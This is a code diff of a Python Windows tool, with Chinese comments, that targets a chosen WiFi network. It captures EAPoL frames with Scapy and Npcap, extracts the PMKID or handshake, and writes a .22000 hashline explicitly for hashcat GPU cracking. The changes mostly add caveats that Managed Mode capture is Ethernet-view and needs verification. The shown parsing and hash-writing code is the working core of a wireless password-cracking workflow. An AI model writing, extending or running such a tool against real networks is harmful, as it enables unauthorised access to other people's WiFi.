@@ -628,8 +628,9 @@ def parse_etl(etl_file: str, ssid: str, bssid: str) -> CaptureResult:
 # ============================================================================
 def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
     """
-    用Scapy+Npcap嘗探真实以太网帧中的EAPoL帧，结构化解析提取PMKID/握手包
-    这是唯一可信的捕获方式：Scapy通过Npcap拿到的是真实链路层帧
+    用Scapy+Npcap在Ethernet视角下捕获EAPoL帧，结构化解析提取PMKID/握手包
+    注意：Managed Mode下Npcap提供的是Ethernet封装，不是raw 802.11
+    捕获结果需要用已知密码做端到端验证才能确认可用性
     """
     # 检查依赖
     try:
@@ -751,8 +752,8 @@ def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
             # ── M1帧（AP→STA）：包含ANonce，可能包含PMKID ──
             if anonce == b'\x00' * 32:
                 continue
-            # 验证源MAC是AP
-            if bssid_bytes and src != mac_ap:
+            # 验证源MAC是AP（Ethernet视角下src=发送方MAC）
+            if mac_ap and src != mac_ap:
                 continue  # 不是目标AP发的M1
             m1_frames.append((anonce, key_data, src, dst, raw_data))
 
@@ -771,10 +772,11 @@ def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
                                 pmkid_val != b'\xff'*16):
                                 # ✓ 真实PMKID：从Scapy捕获的真实EAPoL M1帧中结构化提取
                                 pmkid_result = pmkid_val.hex()
-                                # 用帧中的真实MAC地址（不是外部输入）
+                                # 用帧中的MAC地址
                                 real_mac_ap = src
                                 real_mac_sta = dst
-                                print(f"    ✓ PMKID找到! (来自真实M1帧, AP={src}, STA={dst})")
+                                print(f"    ✓ PMKID候选! (来自EAPoL M1, AP={src}, STA={dst})")
+                                print(f"    ⚠ 注意: Managed Mode下为Ethernet视角，建议用已知密码验证")
                         break
                     kd_pos += 2 + (ie_len if ie_len > 0 else 1)
 
@@ -786,7 +788,7 @@ def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
 
     print(f"    解析结果: M1={len(m1_frames)}, M2={len(m2_frames)}, PMKID={'Yes' if pmkid_result else 'No'}")
 
-    # ── 优先输出PMKID（从真实帧提取，MAC地址也来自帧） ──
+    # ── 优先输出PMKID（从Ethernet视角EAPoL M1中提取） ──
     if pmkid_result:
         hashline = f"WPA*01*{pmkid_result}*{real_mac_ap}*{real_mac_sta}*{essid_hex}***"
         hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_pmkid.22000")
@@ -794,10 +796,10 @@ def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
             f.write(hashline + '\n')
         return CaptureResult(
             success=True, hashline=hashline,
-            hash_file=hash_file, method="PMKID (真实EAPoL M1帧, Scapy+Npcap)"
+            hash_file=hash_file, method="PMKID (Ethernet EAPoL M1, Scapy+Npcap, 需验证)"
         )
 
-    # ── 其次输出EAPoL握手包（M1+M2，MAC地址也来自帧） ──
+    # ── 其次输出EAPoL握手包（M1+M2） ──
     if m1_frames and m2_frames:
         anonce, _, m1_src, m1_dst, _ = m1_frames[0]
         m2_mic, m2_raw, m2_src, m2_dst = m2_frames[0]
@@ -814,7 +816,7 @@ def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
             f.write(hashline + '\n')
         return CaptureResult(
             success=True, hashline=hashline,
-            hash_file=hash_file, method="EAPoL M1+M2 (真实帧, Scapy+Npcap)"
+            hash_file=hash_file, method="EAPoL M1+M2 (Ethernet视角, Scapy+Npcap, 需验证)"
         )
 
     return CaptureResult(error=f"EAPoL帧中未找到有效PMKID或握手包 (M1={len(m1_frames)}, M2={len(m2_frames)})")
@@ -828,12 +830,15 @@ def main():
     print("  ║                                                      ║")
     print("  ║   🔓  WiFi 握手包捕获工具 v4.0  (Windows)           ║")
     print("  ║                                                      ║")
-    print("  ║   扫描WiFi → 选择目标 → 捕获PMKID/握手包           ║")
+    print("  ║   扫描WiFi → 选择目标 → 捕获EAPoL帧               ║")
     print("  ║   输出 .22000 hashline → hashcat GPU破解            ║")
     print("  ║                                                      ║")
-    print("  ║   ✓ Scapy+Npcap真实帧    ✓ GBK/UTF-8编码兼容      ║")
-    print("  ║   ✓ 结构化EAPoL解析     ✓ 捕获后自动恢复WiFi      ║")
-    print("  ║   ✓ hashline有效性验证   ✓ 需要安装Npcap            ║")
+    print("  ║   · Scapy+Npcap Ethernet视角  · GBK/UTF-8编码兼容  ║")
+    print("  ║   · 结构化EAPoL Key解析       · 捕获后自动恢复WiFi  ║")
+    print("  ║   · hashline格式验证           · 需要安装Npcap      ║")
+    print("  ║                                                      ║")
+    print("  ║   ⚠ Managed Mode = Ethernet封装，非raw 802.11      ║")
+    print("  ║   ⚠ 捕获结果建议用已知密码做端到端验证             ║")
     print("  ║                                                      ║")
     print("  ╚══════════════════════════════════════════════════════╝")
     print()
@@ -1024,7 +1029,7 @@ def capture_one(ssid: str, bssid: str) -> CaptureResult:
         print(f"    📶 当前WiFi: {original_ssid}（完成后自动恢复）")
 
     # 用Scapy+Npcap捕获真实帧
-    print("    ┌── Scapy + Npcap (真实帧捕获) ──┐")
+    print("    ┌── Scapy + Npcap (Ethernet EAPoL捕获) ──┐")
     result = capture_scapy(ssid, bssid)
     if result.success:
         print(f"    └── ✓ {result.method} ──┘")
